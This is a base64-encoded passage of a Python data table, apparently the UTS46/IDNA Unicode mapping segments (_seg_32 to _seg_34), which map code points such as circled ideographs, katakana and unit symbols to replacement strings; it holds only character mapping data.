AgICgweDMyQTIsIFwnTVwnLCBcJ1x4ZTVceDg2XHg5OVwnKSxcbiAgICAoMHgzMkEzLCBcJ01cJywgXCdceGU2XHhhZFx4YTNcJyksXG4gICAgKDB4MzJBNCwgXCdNXCcsIFwnXHhlNFx4YjhceDhhXCcpLFxuICAgICgweDMyQTUsIFwnTVwnLCBcJ1x4ZTRceGI4XHhhZFwnKSxcbiAgICAoMHgzMkE2LCBcJ01cJywgXCdceGU0XHhiOFx4OGJcJyksXG4gICAgKDB4MzJBNywgXCdNXCcsIFwnXHhlNVx4YjdceGE2XCcpLFxuICAgICgweDMyQTgsIFwnTVwnLCBcJ1x4ZTVceDhmXHhiM1wnKSxcbiAgICAoMHgzMkE5LCBcJ01cJywgXCdceGU1XHg4Y1x4YmJcJyksXG4gICAgKDB4MzJBQSwgXCdNXCcsIFwnXHhlNVx4YWVceDk3XCcpLFxuICAgICgweDMyQUIsIFwnTVwnLCBcJ1x4ZTVceGFkXHhhNlwnKSxcbiAgICAoMHgzMkFDLCBcJ01cJywgXCdceGU3XHg5Ylx4YTNcJyksXG4gICAgKDB4MzJBRCwgXCdNXCcsIFwnXHhlNFx4YmNceDgxXCcpLFxuICAgICgweDMyQUUsIFwnTVwnLCBcJ1x4ZThceGIzXHg4N1wnKSxcbiAgICAoMHgzMkFGLCBcJ01cJywgXCdceGU1XHg4ZFx4OTRcJyksXG4gICAgKDB4MzJCMCwgXCdNXCcsIFwnXHhlNVx4YTRceDljXCcpLFxuICAgICgweDMyQjEsIFwnTVwnLCBcJzM2XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMzIoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDMyQjIsIFwnTVwnLCBcJzM3XCcpLFxuICAgICgweDMyQjMsIFwnTVwnLCBcJzM4XCcpLFxuICAgICgweDMyQjQsIFwnTVwnLCBcJzM5XCcpLFxuICAgICgweDMyQjUsIFwnTVwnLCBcJzQwXCcpLFxuICAgICgweDMyQjYsIFwnTVwnLCBcJzQxXCcpLFxuICAgICgweDMyQjcsIFwnTVwnLCBcJzQyXCcpLFxuICAgICgweDMyQjgsIFwnTVwnLCBcJzQzXCcpLFxuICAgICgweDMyQjksIFwnTVwnLCBcJzQ0XCcpLFxuICAgICgweDMyQkEsIFwnTVwnLCBcJzQ1XCcpLFxuICAgICgweDMyQkIsIFwnTVwnLCBcJzQ2XCcpLFxuICAgICgweDMyQkMsIFwnTVwnLCBcJzQ3XCcpLFxuICAgICgweDMyQkQsIFwnTVwnLCBcJzQ4XCcpLFxuICAgICgweDMyQkUsIFwnTVwnLCBcJzQ5XCcpLFxuICAgICgweDMyQkYsIFwnTVwnLCBcJzUwXCcpLFxuICAgICgweDMyQzAsIFwnTVwnLCBcJzFceGU2XHg5Y1x4ODhcJyksXG4gICAgKDB4MzJDMSwgXCdNXCcsIFwnMlx4ZTZceDljXHg4OFwnKSxcbiAgICAoMHgzMkMyLCBcJ01cJywgXCczXHhlNlx4OWNceDg4XCcpLFxuICAgICgweDMyQzMsIFwnTVwnLCBcJzRceGU2XHg5Y1x4ODhcJyksXG4gICAgKDB4MzJDNCwgXCdNXCcsIFwnNVx4ZTZceDljXHg4OFwnKSxcbiAgICAoMHgzMkM1LCBcJ01cJywgXCc2XHhlNlx4OWNceDg4XCcpLFxuICAgICgweDMyQzYsIFwnTVwnLCBcJzdceGU2XHg5Y1x4ODhcJyksXG4gICAgKDB4MzJDNywgXCdNXCcsIFwnOFx4ZTZceDljXHg4OFwnKSxcbiAgICAoMHgzMkM4LCBcJ01cJywgXCc5XHhlNlx4OWNceDg4XCcpLFxuICAgICgweDMyQzksIFwnTVwnLCBcJzEwXHhlNlx4OWNceDg4XCcpLFxuICAgICgweDMyQ0EsIFwnTVwnLCBcJzExXHhlNlx4OWNceDg4XCcpLFxuICAgICgweDMyQ0IsIFwnTVwnLCBcJzEyXHhlNlx4OWNceDg4XCcpLFxuICAgICgweDMyQ0MsIFwnTVwnLCBcJ2hnXCcpLFxuICAgICgweDMyQ0QsIFwnTVwnLCBcJ2VyZ1wnKSxcbiAgICAoMHgzMkNFLCBcJ01cJywgXCdldlwnKSxcbiAgICAoMHgzMkNGLCBcJ01cJywgXCdsdGRcJyksXG4gICAgKDB4MzJEMCwgXCdNXCcsIFwnXHhlM1x4ODJceGEyXCcpLFxuICAgICgweDMyRDEsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhNFwnKSxcbiAgICAoMHgzMkQyLCBcJ01cJywgXCdceGUzXHg4Mlx4YTZcJyksXG4gICAgKDB4MzJEMywgXCdNXCcsIFwnXHhlM1x4ODJceGE4XCcpLFxuICAgICgweDMyRDQsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhYVwnKSxcbiAgICAoMHgzMkQ1LCBcJ01cJywgXCdceGUzXHg4Mlx4YWJcJyksXG4gICAgKDB4MzJENiwgXCdNXCcsIFwnXHhlM1x4ODJceGFkXCcpLFxuICAgICgweDMyRDcsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhZlwnKSxcbiAgICAoMHgzMkQ4LCBcJ01cJywgXCdceGUzXHg4Mlx4YjFcJyksXG4gICAgKDB4MzJEOSwgXCdNXCcsIFwnXHhlM1x4ODJceGIzXCcpLFxuICAgICgweDMyREEsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiNVwnKSxcbiAgICAoMHgzMkRCLCBcJ01cJywgXCdceGUzXHg4Mlx4YjdcJyksXG4gICAgKDB4MzJEQywgXCdNXCcsIFwnXHhlM1x4ODJceGI5XCcpLFxuICAgICgweDMyREQsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiYlwnKSxcbiAgICAoMHgzMkRFLCBcJ01cJywgXCdceGUzXHg4Mlx4YmRcJyksXG4gICAgKDB4MzJERiwgXCdNXCcsIFwnXHhlM1x4ODJceGJmXCcpLFxuICAgICgweDMyRTAsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4MVwnKSxcbiAgICAoMHgzMkUxLCBcJ01cJywgXCdceGUzXHg4M1x4ODRcJyksXG4gICAgKDB4MzJFMiwgXCdNXCcsIFwnXHhlM1x4ODNceDg2XCcpLFxuICAgICgweDMyRTMsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4OFwnKSxcbiAgICAoMHgzMkU0LCBcJ01cJywgXCdceGUzXHg4M1x4OGFcJyksXG4gICAgKDB4MzJFNSwgXCdNXCcsIFwnXHhlM1x4ODNceDhiXCcpLFxuICAgICgweDMyRTYsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4Y1wnKSxcbiAgICAoMHgzMkU3LCBcJ01cJywgXCdceGUzXHg4M1x4OGRcJyksXG4gICAgKDB4MzJFOCwgXCdNXCcsIFwnXHhlM1x4ODNceDhlXCcpLFxuICAgICgweDMyRTksIFwnTVwnLCBcJ1x4ZTNceDgzXHg4ZlwnKSxcbiAgICAoMHgzMkVBLCBcJ01cJywgXCdceGUzXHg4M1x4OTJcJyksXG4gICAgKDB4MzJFQiwgXCdNXCcsIFwnXHhlM1x4ODNceDk1XCcpLFxuICAgICgweDMyRUMsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5OFwnKSxcbiAgICAoMHgzMkVELCBcJ01cJywgXCdceGUzXHg4M1x4OWJcJyksXG4gICAgKDB4MzJFRSwgXCdNXCcsIFwnXHhlM1x4ODNceDllXCcpLFxuICAgICgweDMyRUYsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5ZlwnKSxcbiAgICAoMHgzMkYwLCBcJ01cJywgXCdceGUzXHg4M1x4YTBcJyksXG4gICAgKDB4MzJGMSwgXCdNXCcsIFwnXHhlM1x4ODNceGExXCcpLFxuICAgICgweDMyRjIsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhMlwnKSxcbiAgICAoMHgzMkYzLCBcJ01cJywgXCdceGUzXHg4M1x4YTRcJyksXG4gICAgKDB4MzJGNCwgXCdNXCcsIFwnXHhlM1x4ODNceGE2XCcpLFxuICAgICgweDMyRjUsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhOFwnKSxcbiAgICAoMHgzMkY2LCBcJ01cJywgXCdceGUzXHg4M1x4YTlcJyksXG4gICAgKDB4MzJGNywgXCdNXCcsIFwnXHhlM1x4ODNceGFhXCcpLFxuICAgICgweDMyRjgsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMkY5LCBcJ01cJywgXCdceGUzXHg4M1x4YWNcJyksXG4gICAgKDB4MzJGQSwgXCdNXCcsIFwnXHhlM1x4ODNceGFkXCcpLFxuICAgICgweDMyRkIsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhZlwnKSxcbiAgICAoMHgzMkZDLCBcJ01cJywgXCdceGUzXHg4M1x4YjBcJyksXG4gICAgKDB4MzJGRCwgXCdNXCcsIFwnXHhlM1x4ODNceGIxXCcpLFxuICAgICgweDMyRkUsIFwnTVwnLCBcJ1x4ZTNceDgzXHhiMlwnKSxcbiAgICAoMHgzMkZGLCBcJ01cJywgXCdceGU0XHhiYlx4YTRceGU1XHg5Mlx4OGNcJyksXG4gICAgKDB4MzMwMCwgXCdNXCcsIFwnXHhlM1x4ODJceGEyXHhlM1x4ODNceDkxXHhlM1x4ODNceGJjXHhlM1x4ODNceDg4XCcpLFxuICAgICgweDMzMDEsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhMlx4ZTNceDgzXHhhYlx4ZTNceDgzXHg5NVx4ZTNceDgyXHhhMVwnKSxcbiAgICAoMHgzMzAyLCBcJ01cJywgXCdceGUzXHg4Mlx4YTJceGUzXHg4M1x4YjNceGUzXHg4M1x4OWFceGUzXHg4Mlx4YTJcJyksXG4gICAgKDB4MzMwMywgXCdNXCcsIFwnXHhlM1x4ODJceGEyXHhlM1x4ODNceGJjXHhlM1x4ODNceGFiXCcpLFxuICAgICgweDMzMDQsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhNFx4ZTNceDgzXHg4Ylx4ZTNceDgzXHhiM1x4ZTNceDgyXHhiMFwnKSxcbiAgICAoMHgzMzA1LCBcJ01cJywgXCdceGUzXHg4Mlx4YTRceGUzXHg4M1x4YjNceGUzXHg4M1x4ODFcJyksXG4gICAgKDB4MzMwNiwgXCdNXCcsIFwnXHhlM1x4ODJceGE2XHhlM1x4ODJceGE5XHhlM1x4ODNceGIzXCcpLFxuICAgICgweDMzMDcsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhOFx4ZTNceDgyXHhiOVx4ZTNceDgyXHhhZlx4ZTNceDgzXHhiY1x4ZTNceDgzXHg4OVwnKSxcbiAgICAoMHgzMzA4LCBcJ01cJywgXCdceGUzXHg4Mlx4YThceGUzXHg4M1x4YmNceGUzXHg4Mlx4YWJceGUzXHg4M1x4YmNcJyksXG4gICAgKDB4MzMwOSwgXCdNXCcsIFwnXHhlM1x4ODJceGFhXHhlM1x4ODNceGIzXHhlM1x4ODJceGI5XCcpLFxuICAgICgweDMzMEEsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhYVx4ZTNceDgzXHhiY1x4ZTNceDgzXHhhMFwnKSxcbiAgICAoMHgzMzBCLCBcJ01cJywgXCdceGUzXHg4Mlx4YWJceGUzXHg4Mlx4YTRceGUzXHg4M1x4YWFcJyksXG4gICAgKDB4MzMwQywgXCdNXCcsIFwnXHhlM1x4ODJceGFiXHhlM1x4ODNceGE5XHhlM1x4ODNceDgzXHhlM1x4ODNceDg4XCcpLFxuICAgICgweDMzMEQsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhYlx4ZTNceDgzXHhhZFx4ZTNceDgzXHhhYVx4ZTNceDgzXHhiY1wnKSxcbiAgICAoMHgzMzBFLCBcJ01cJywgXCdceGUzXHg4Mlx4YWNceGUzXHg4M1x4YWRceGUzXHg4M1x4YjNcJyksXG4gICAgKDB4MzMwRiwgXCdNXCcsIFwnXHhlM1x4ODJceGFjXHhlM1x4ODNceGIzXHhlM1x4ODNceDllXCcpLFxuICAgICgweDMzMTAsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhZVx4ZTNceDgyXHhhY1wnKSxcbiAgICAoMHgzMzExLCBcJ01cJywgXCdceGUzXHg4Mlx4YWVceGUzXHg4M1x4OGJceGUzXHg4M1x4YmNcJyksXG4gICAgKDB4MzMxMiwgXCdNXCcsIFwnXHhlM1x4ODJceGFkXHhlM1x4ODNceGE1XHhlM1x4ODNceGFhXHhlM1x4ODNceGJjXCcpLFxuICAgICgweDMzMTMsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhZVx4ZTNceDgzXHhhYlx4ZTNceDgzXHg4MFx4ZTNceDgzXHhiY1wnKSxcbiAgICAoMHgzMzE0LCBcJ01cJywgXCdceGUzXHg4Mlx4YWRceGUzXHg4M1x4YWRcJyksXG4gICAgKDB4MzMxNSwgXCdNXCcsIFwnXHhlM1x4ODJceGFkXHhlM1x4ODNceGFkXHhlM1x4ODJceGIwXHhlM1x4ODNceGE5XHhlM1x4ODNceGEwXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMzMoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDMzMTYsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhZFx4ZTNceDgzXHhhZFx4ZTNceDgzXHhhMVx4ZTNceDgzXHhiY1x4ZTNceDgzXHg4OFx4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMzE3LCBcJ01cJywgXCdceGUzXHg4Mlx4YWRceGUzXHg4M1x4YWRceGUzXHg4M1x4YWZceGUzXHg4M1x4ODNceGUzXHg4M1x4ODhcJyksXG4gICAgKDB4MzMxOCwgXCdNXCcsIFwnXHhlM1x4ODJceGIwXHhlM1x4ODNceGE5XHhlM1x4ODNceGEwXCcpLFxuICAgICgweDMzMTksIFwnTVwnLCBcJ1x4ZTNceDgyXHhiMFx4ZTNceDgzXHhhOVx4ZTNceDgzXHhhMFx4ZTNceDgzXHg4OFx4ZTNceDgzXHhiM1wnKSxcbiAgICAoMHgzMzFBLCBcJ01cJywgXCdceGUzXHg4Mlx4YWZceGUzXHg4M1x4YWJceGUzXHg4Mlx4YmNceGUzXHg4Mlx4YTRceGUzXHg4M1x4YWRcJyksXG4gICAgKDB4MzMxQiwgXCdNXCcsIFwnXHhlM1x4ODJceGFmXHhlM1x4ODNceGFkXHhlM1x4ODNceGJjXHhlM1x4ODNceDhkXCcpLFxuICAgICgweDMzMUMsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiMVx4ZTNceDgzXHhiY1x4ZTNceDgyXHhiOVwnKSxcbiAgICAoMHgzMzFELCBcJ01cJywgXCdceGUzXHg4Mlx4YjNceGUzXHg4M1x4YWJceGUzXHg4M1x4OGFcJyksXG4gICAgKDB4MzMxRSwgXCdNXCcsIFwnXHhlM1x4ODJceGIzXHhlM1x4ODNceGJjXHhlM1x4ODNceDlkXCcpLFxuICAgICgweDMzMUYsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiNVx4ZTNceDgyXHhhNFx4ZTNceDgyXHhhZlx4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMzIwLCBcJ01cJywgXCdceGUzXHg4Mlx4YjVceGUzXHg4M1x4YjNceGUzXHg4M1x4ODFceGUzXHg4M1x4YmNceGUzXHg4M1x4YTBcJyksXG4gICAgKDB4MzMyMSwgXCdNXCcsIFwnXHhlM1x4ODJceGI3XHhlM1x4ODNceGFhXHhlM1x4ODNceGIzXHhlM1x4ODJceGIwXCcpLFxuICAgICgweDMzMjIsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiYlx4ZTNceDgzXHhiM1x4ZTNceDgzXHg4MVwnKSxcbiAgICAoMHgzMzIzLCBcJ01cJywgXCdceGUzXHg4Mlx4YmJceGUzXHg4M1x4YjNceGUzXHg4M1x4ODhcJyksXG4gICAgKDB4MzMyNCwgXCdNXCcsIFwnXHhlM1x4ODNceDgwXHhlM1x4ODNceGJjXHhlM1x4ODJceGI5XCcpLFxuICAgICgweDMzMjUsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4N1x4ZTNceDgyXHhiN1wnKSxcbiAgICAoMHgzMzI2LCBcJ01cJywgXCdceGUzXHg4M1x4ODlceGUzXHg4M1x4YWJcJyksXG4gICAgKDB4MzMyNywgXCdNXCcsIFwnXHhlM1x4ODNceDg4XHhlM1x4ODNceGIzXCcpLFxuICAgICgweDMzMjgsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4YVx4ZTNceDgzXHg4ZVwnKSxcbiAgICAoMHgzMzI5LCBcJ01cJywgXCdceGUzXHg4M1x4OGVceGUzXHg4M1x4ODNceGUzXHg4M1x4ODhcJyksXG4gICAgKDB4MzMyQSwgXCdNXCcsIFwnXHhlM1x4ODNceDhmXHhlM1x4ODJceGE0XHhlM1x4ODNceDg0XCcpLFxuICAgICgweDMzMkIsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5MVx4ZTNceDgzXHhiY1x4ZTNceDgyXHhiYlx4ZTNceDgzXHhiM1x4ZTNceDgzXHg4OFwnKSxcbiAgICAoMHgzMzJDLCBcJ01cJywgXCdceGUzXHg4M1x4OTFceGUzXHg4M1x4YmNceGUzXHg4M1x4ODRcJyksXG4gICAgKDB4MzMyRCwgXCdNXCcsIFwnXHhlM1x4ODNceDkwXHhlM1x4ODNceGJjXHhlM1x4ODNceGFjXHhlM1x4ODNceGFiXCcpLFxuICAgICgweDMzMkUsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5NFx4ZTNceDgyXHhhMlx4ZTNceDgyXHhiOVx4ZTNceDgzXHg4OFx4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMzJGLCBcJ01cJywgXCdceGUzXHg4M1x4OTRceGUzXHg4Mlx4YWZceGUzXHg4M1x4YWJcJyksXG4gICAgKDB4MzMzMCwgXCdNXCcsIFwnXHhlM1x4ODNceDk0XHhlM1x4ODJceGIzXCcpLFxuICAgICgweDMzMzEsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5M1x4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMzMyLCBcJ01cJywgXCdceGUzXHg4M1x4OTVceGUzXHg4Mlx4YTFceGUzXHg4M1x4YTlceGUzXHg4M1x4ODNceGUzXHg4M1x4ODlcJyksXG4gICAgKDB4MzMzMywgXCdNXCcsIFwnXHhlM1x4ODNceDk1XHhlM1x4ODJceGEzXHhlM1x4ODNceGJjXHhlM1x4ODNceDg4XCcpLFxuICAgICgweDMzMzQsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5Nlx4ZTNceDgzXHg4M1x4ZTNceDgyXHhiN1x4ZTNceDgyXHhhN1x4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMzM1LCBcJ01cJywgXCdceGUzXHg4M1x4OTVceGUzXHg4M1x4YTlceGUzXHg4M1x4YjNcJyksXG4gICAgKDB4MzMzNiwgXCdNXCcsIFwnXHhlM1x4ODNceDk4XHhlM1x4ODJceGFmXHhlM1x4ODJceGJmXHhlM1x4ODNceGJjXHhlM1x4ODNceGFiXCcpLFxuICAgICgweDMzMzcsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5YVx4ZTNceDgyXHhiZFwnKSxcbiAgICAoMHgzMzM4LCBcJ01cJywgXCdceGUzXHg4M1x4OWFceGUzXHg4M1x4OGJceGUzXHg4M1x4OTJcJyksXG4gICAgKDB4MzMzOSwgXCdNXCcsIFwnXHhlM1x4ODNceDk4XHhlM1x4ODNceGFiXHhlM1x4ODNceDg0XCcpLFxuICAgICgweDMzM0EsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5YVx4ZTNceDgzXHhiM1x4ZTNceDgyXHhiOVwnKSxcbiAgICAoMHgzMzNCLCBcJ01cJywgXCdceGUzXHg4M1x4OWFceGUzXHg4M1x4YmNceGUzXHg4Mlx4YjhcJyksXG4gICAgKDB4MzMzQywgXCdNXCcsIFwnXHhlM1x4ODNceDk5XHhlM1x4ODNceGJjXHhlM1x4ODJceGJmXCcpLFxuICAgICgweDMzM0QsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5ZFx4ZTNceDgyXHhhNFx4ZTNceDgzXHhiM1x4ZTNceDgzXHg4OFwnKSxcbiAgICAoMHgzMzNFLCBcJ01cJywgXCdceGUzXHg4M1x4OWNceGUzXHg4M1x4YWJceGUzXHg4M1x4ODhcJyksXG4gICAgKDB4MzMzRiwgXCdNXCcsIFwnXHhlM1x4ODNceDliXHhlM1x4ODNceGIzXCcpLFxuICAgICgweDMzNDAsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5ZFx4ZTNceDgzXHhiM1x4ZTNceDgzXHg4OVwnKSxcbiAgICAoMHgzMzQxLCBcJ01cJywgXCdceGUzXHg4M1x4OWJceGUzXHg4M1x4YmNceGUzXHg4M1x4YWJcJyksXG4gICAgKDB4MzM0MiwgXCdNXCcsIFwnXHhlM1x4ODNceDliXHhlM1x4ODNceGJjXHhlM1x4ODNceGIzXCcpLFxuICAgICgweDMzNDMsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5ZVx4ZTNceDgyXHhhNFx4ZTNceDgyXHhhZlx4ZTNceDgzXHhhZFwnKSxcbiAgICAoMHgzMzQ0LCBcJ01cJywgXCdceGUzXHg4M1x4OWVceGUzXHg4Mlx4YTRceGUzXHg4M1x4YWJcJyksXG4gICAgKDB4MzM0NSwgXCdNXCcsIFwnXHhlM1x4ODNceDllXHhlM1x4ODNceDgzXHhlM1x4ODNceDhmXCcpLFxuICAgICgweDMzNDYsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5ZVx4ZTNceDgzXHhhYlx4ZTNceDgyXHhhZlwnKSxcbiAgICAoMHgzMzQ3LCBcJ01cJywgXCdceGUzXHg4M1x4OWVceGUzXHg4M1x4YjNceGUzXHg4Mlx4YjdceGUzXHg4M1x4YTdceGUzXHg4M1x4YjNcJyksXG4gICAgKDB4MzM0OCwgXCdNXCcsIFwnXHhlM1x4ODNceDlmXHhlM1x4ODJceGFmXHhlM1x4ODNceGFkXHhlM1x4ODNceGIzXCcpLFxuICAgICgweDMzNDksIFwnTVwnLCBcJ1x4ZTNceDgzXHg5Zlx4ZTNceDgzXHhhYVwnKSxcbiAgICAoMHgzMzRBLCBcJ01cJywgXCdceGUzXHg4M1x4OWZceGUzXHg4M1x4YWFceGUzXHg4M1x4OTBceGUzXHg4M1x4YmNceGUzXHg4M1x4YWJcJyksXG4gICAgKDB4MzM0QiwgXCdNXCcsIFwnXHhlM1x4ODNceGExXHhlM1x4ODJceGFjXCcpLFxuICAgICgweDMzNEMsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhMVx4ZTNceDgyXHhhY1x4ZTNceDgzXHg4OFx4ZTNceDgzXHhiM1wnKSxcbiAgICAoMHgzMzRELCBcJ01cJywgXCdceGUzXHg4M1x4YTFceGUzXHg4M1x4YmNceGUzXHg4M1x4ODhceGUzXHg4M1x4YWJcJyksXG4gICAgKDB4MzM0RSwgXCdNXCcsIFwnXHhlM1x4ODNceGE0XHhlM1x4ODNceGJjXHhlM1x4ODNceDg5XCcpLFxuICAgICgweDMzNEYsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhNFx4ZTNceDgzXHhiY1x4ZTNceDgzXHhhYlwnKSxcbiAgICAoMHgzMzUwLCBcJ01cJywgXCdceGUzXHg4M1x4YTZceGUzXHg4Mlx4YTJceGUzXHg4M1x4YjNcJyksXG4gICAgKDB4MzM1MSwgXCdNXCcsIFwnXHhlM1x4ODNceGFhXHhlM1x4ODNceDgzXHhlM1x4ODNceDg4XHhlM1x4ODNceGFiXCcpLFxuICAgICgweDMzNTIsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhYVx4ZTNceDgzXHhhOVwnKSxcbiAgICAoMHgzMzUzLCBcJ01cJywgXCdceGUzXHg4M1x4YWJceGUzXHg4M1x4OTRceGUzXHg4M1x4YmNcJyksXG4gICAgKDB4MzM1NCwgXCdNXCcsIFwnXHhlM1x4ODNceGFiXHhlM1x4ODNceGJjXHhlM1x4ODNceDk2XHhlM1x4ODNceGFiXCcpLFxuICAgICgweDMzNTUsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhY1x4ZTNceDgzXHhhMFwnKSxcbiAgICAoMHgzMzU2LCBcJ01cJywgXCdceGUzXHg4M1x4YWNceGUzXHg4M1x4YjNceGUzXHg4M1x4ODhceGUzXHg4Mlx4YjJceGUzXHg4M1x4YjNcJyksXG4gICAgKDB4MzM1NywgXCdNXCcsIFwnXHhlM1x4ODNceGFmXHhlM1x4ODNceDgzXHhlM1x4ODNceDg4XCcpLFxuICAgICgweDMzNTgsIFwnTVwnLCBcJzBceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM1OSwgXCdNXCcsIFwnMVx4ZTdceDgyXHhiOVwnKSxcbiAgICAoMHgzMzVBLCBcJ01cJywgXCcyXHhlN1x4ODJceGI5XCcpLFxuICAgICgweDMzNUIsIFwnTVwnLCBcJzNceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM1QywgXCdNXCcsIFwnNFx4ZTdceDgyXHhiOVwnKSxcbiAgICAoMHgzMzVELCBcJ01cJywgXCc1XHhlN1x4ODJceGI5XCcpLFxuICAgICgweDMzNUUsIFwnTVwnLCBcJzZceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM1RiwgXCdNXCcsIFwnN1x4ZTdceDgyXHhiOVwnKSxcbiAgICAoMHgzMzYwLCBcJ01cJywgXCc4XHhlN1x4ODJceGI5XCcpLFxuICAgICgweDMzNjEsIFwnTVwnLCBcJzlceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2MiwgXCdNXCcsIFwnMTBceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2MywgXCdNXCcsIFwnMTFceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2NCwgXCdNXCcsIFwnMTJceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2NSwgXCdNXCcsIFwnMTNceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2NiwgXCdNXCcsIFwnMTRceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2NywgXCdNXCcsIFwnMTVceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2OCwgXCdNXCcsIFwnMTZceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2OSwgXCdNXCcsIFwnMTdceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2QSwgXCdNXCcsIFwnMThceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2QiwgXCdNXCcsIFwnMTlceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2QywgXCdNXCcsIFwnMjBceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2RCwgXCdNXCcsIFwnMjFceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2RSwgXCdNXCcsIFwnMjJceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM2RiwgXCdNXCcsIFwnMjNceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM3MCwgXCdNXCcsIFwnMjRceGU3XHg4Mlx4YjlcJyksXG4gICAgKDB4MzM3MSwgXCdNXCcsIFwnaHBhXCcpLFxuICAgICgweDMzNzIsIFwnTVwnLCBcJ2RhXCcpLFxuICAgICgweDMzNzMsIFwnTVwnLCBcJ2F1XCcpLFxuICAgICgweDMzNzQsIFwnTVwnLCBcJ2JhclwnKSxcbiAgICAoMHgzMzc1LCBcJ01cJywgXCdvdlwnKSxcbiAgICAoMHgzMzc2LCBcJ01cJywgXCdwY1wnKSxcbiAgICAoMHgzMzc3LCBcJ01cJywgXCdkbVwnKSxcbiAgICAoMHgzMzc4LCBcJ01cJywgXCdkbTJcJyksXG4gICAgKDB4MzM3OSwgXCdNXCcsIFwnZG0zXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMzQoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDMzN0EsIFwnTVwnLCBcJ2l1XCcpLFxuICAgICgweDMzN0IsIFwnTVwnLCBcJ1x4ZTVceGI5XHhiM1x4ZTZceDg4XHg5MFwnKSxcbiAgICAoMHgzMzdDLCBcJ01cJywgXCdceGU2XHg5OFx4YWRceGU1XHg5Mlx4OGNcJyksXG4gICAgKDB4MzM3RCwgXCdNXCcsIFwnXHhlNVx4YTRceGE3XHhlNlx4YWRceGEzXCcpLFxuICAgICgweDMzN0UsIFwnTVwnLCBcJ1x4ZTZceDk4XHg4ZVx4ZTZceGIyXHhiYlwnKSxcbiAgICAoMHgzMzdGLCBcJ01cJywgXCdceGU2XHhhMFx4YWFceGU1XHhiY1x4OGZceGU0XHhiY1x4OWFceGU3XHhhNFx4YmVcJyksXG4gICAgKDB4MzM4MCwgXCdNXCcsIFwncGFcJyksXG4gICAgKDB4MzM4MSwgXCdNXCcsIFwnbmFcJyksXG4gICAgKDB4MzM4MiwgXCdNXCcsIFwnXHhjZVx4YmNhXCcpLFxuICAgICgweDMzODMsIFwnTVwnLCBcJ21hXCcpLFxuICAgICgweDMzODQsIFwnTVwnLCBcJ2thXCcpLFxuICAgICgweDMzODUsIFwnTVwnLCBcJ2tiXCcpLFxuICAgICgweDMzODYsIFwnTVwnLCBcJ21iXCcpLFxuICAgICgweDMzO